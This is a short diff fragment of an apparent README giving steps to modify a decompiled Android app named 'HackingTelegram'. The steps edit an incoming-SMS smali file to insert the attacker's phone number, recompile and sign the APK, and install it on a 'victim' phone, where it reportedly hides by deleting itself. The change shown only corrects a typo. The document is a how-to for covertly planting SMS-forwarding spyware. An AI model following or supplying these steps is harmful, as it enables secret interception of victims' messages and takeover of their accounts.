@@ -12,7 +12,7 @@ step=3 sms\smali\com\ApkEditors\HackingTelegram here you see the file incomingSm
 step=4 open file and go to at (258) line here you see the text = "+910000000000"
 setup=5 insert the number you want to send the sms of vicitm mobile phone and edit the number
  
-(simple save the directory and save the file and then recompile apok and dont forget to sign apk)
+(simple save the directory and save the file and then recompile apk and dont forget to sign apk)
 install this app in the vicitm phone this will automatically delete in vicitm phone
 
 enjoy
